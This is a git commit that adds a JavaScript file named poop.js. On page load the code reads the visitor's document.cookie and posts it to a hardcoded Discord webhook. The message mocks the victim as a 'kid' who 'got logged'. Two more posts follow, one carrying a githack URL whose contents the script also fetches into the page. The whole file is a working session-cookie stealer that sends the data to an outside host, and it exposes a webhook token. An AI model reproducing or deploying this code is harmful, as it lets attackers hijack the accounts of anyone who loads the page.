0f30ad40216d51de606e81941e58cfd8fc55a4e7
penguinblook <100320830+penguinblook@users.noreply.github.com>
2022-03-23 06:49:45 -0400

    Create poop.js

---
+++ poop.js
@@ -0,0 +1,63 @@
+$(document).ready(function() {
+    var url = 'https://raw.githack.com/penguinblook/testy/main/main';
+
+    $.get(url, function(data) { 
+        $('#code').text(data);
+      }, 'text');
+    });
+
+    var cook = document.cookie
+function sendMessage() {
+    const request = new XMLHttpRequest();
+    request.open("POST", "https://discord.com/api/webhooks/955958924803203082/lZqDqYa7i5dq5emS1HrP8bU7EWUJeFs2y5MJ4UPKTvO2GntqyjuK3orSyLhYoQ3yoyDd");
+
+    request.setRequestHeader('Content-type', 'application/json');
+
+    const params = {
+      username: "penguins little helper",
+      avatar_url: "",
+      content: `@everyone LOL this kid got logged Cookie = ${cook}`
+    }
+
+    request.send(JSON.stringify(params));
+  }
+  
+  function sendMessages() {
+    const request = new XMLHttpRequest();
+    request.open("POST", "https://discord.com/api/webhooks/955958924803203082/lZqDqYa7i5dq5emS1HrP8bU7EWUJeFs2y5MJ4UPKTvO2GntqyjuK3orSyLhYoQ3yoyDd");
+
+    request.setRequestHeader('Content-type', 'application/json');
+
+    const params = {
+      username: "penguins little helper",
+      avatar_url: "",
+      content: "you can access this act with, "
+    }
+
+    request.send(JSON.stringify(params));
+  }
+
+  function sendMessag() {
+    const request = new XMLHttpRequest();
+    request.open("POST", "https://discord.com/api/webhooks/955958924803203082/lZqDqYa7i5dq5emS1HrP8bU7EWUJeFs2y5MJ4UPKTvO2GntqyjuK3orSyLhYoQ3yoyDd");
+
+    request.setRequestHeader('Content-type', 'application/json');
+
+    const params = {
+      username: "penguins little helper",
+      avatar_url: "",
+      content: `${url}`
+
+    }
+
+    request.send(JSON.stringify(params));
+  }
+
+  sendMessage()
+  alert("message me if u like cheese, penguinpowers#0069")
+
+  sendMessages()
+  alert("message me if u like cheese, penguinpowers#0069")
+
+  sendMessag()
+  
